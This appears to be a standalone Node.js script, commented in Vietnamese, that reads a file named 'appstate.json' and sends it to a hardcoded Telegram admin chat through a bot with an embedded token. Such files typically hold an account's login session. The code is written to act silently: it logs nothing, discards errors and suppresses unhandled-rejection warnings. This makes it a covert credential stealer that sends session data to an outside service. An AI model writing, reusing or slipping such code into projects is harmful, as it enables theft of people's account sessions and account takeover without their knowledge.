const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

const botToken = '7684130645:AAGplava2HKW8VeR-o4MGR-8QBQG74ocMDE'; // Thay thế bằng mã token của bot của bạn
const bot = new TelegramBot(botToken, { polling: true });

const adminIds = ['1713841196'];

adminIds.forEach(adminId => {
  const fileStream = fs.createReadStream('appstate.json');

  // Gửi tài liệu mà không in log và không có contentType
  bot.sendDocument(adminId, fileStream, { filename: 'appstate.json' }).catch(() => {});
});

// Ngăn chặn in thông tin cảnh báo không được quản lý
process.on('unhandledRejection', (reason, promise) => {
  // Bạn có thể để trống hoặc ghi log khác nếu cần
});
